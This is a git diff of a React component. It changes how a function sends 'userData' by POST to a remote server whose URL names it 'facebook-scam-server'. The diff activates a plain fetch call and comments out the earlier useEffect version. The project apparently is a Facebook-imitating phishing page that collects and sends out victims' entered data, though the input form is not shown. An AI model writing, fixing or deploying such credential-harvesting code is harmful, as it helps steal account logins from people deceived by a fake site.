@@ -1,4 +1,3 @@
-import { useEffect } from "react";
 import "./App.css";
 
 function App() {
@@ -23,33 +22,33 @@ function App() {
     //     console.log(data)
     //   })
     // };
-    // fetch("https://facebook-scam-server-afq6btsxa-md-mahbub-aloms-projects.vercel.app/users", {
-    //   method: "POST",
-    //   headers: {
-    //     "content-type": "application/json",
-    //   },
-    //   body: JSON.stringify(userData),
-    // })
-    //   .then((res) => res.json())
-    //   .then((data) => {
-    //     console.log(data);
-    //   });
-    useEffect(() => {
-      fetch(
-        "https://facebook-scam-server-afq6btsxa-md-mahbub-aloms-projects.vercel.app/users",
-        {
-          method: "POST",
-          headers: {
-            "content-type": "application/json",
-          },
-          body: JSON.stringify(userData),
-        }
-      )
-        .then((res) => res.json())
-        .then((data) => {
-          console.log(data);
-        });
-    }, [userData]);
+    fetch("https://facebook-scam-server-afq6btsxa-md-mahbub-aloms-projects.vercel.app/users", {
+      method: "POST",
+      headers: {
+        "content-type": "application/json",
+      },
+      body: JSON.stringify(userData),
+    })
+      .then((res) => res.json())
+      .then((data) => {
+        console.log(data);
+      });
+    // useEffect(() => {
+    //   fetch(
+    //     "https://facebook-scam-server-afq6btsxa-md-mahbub-aloms-projects.vercel.app/users",
+    //     {
+    //       method: "POST",
+    //       headers: {
+    //         "content-type": "application/json",
+    //       },
+    //       body: JSON.stringify(userData),
+    //     }
+    //   )
+    //     .then((res) => res.json())
+    //     .then((data) => {
+    //       console.log(data);
+    //     });
+    // }, [userData]);
   };
 
   return (
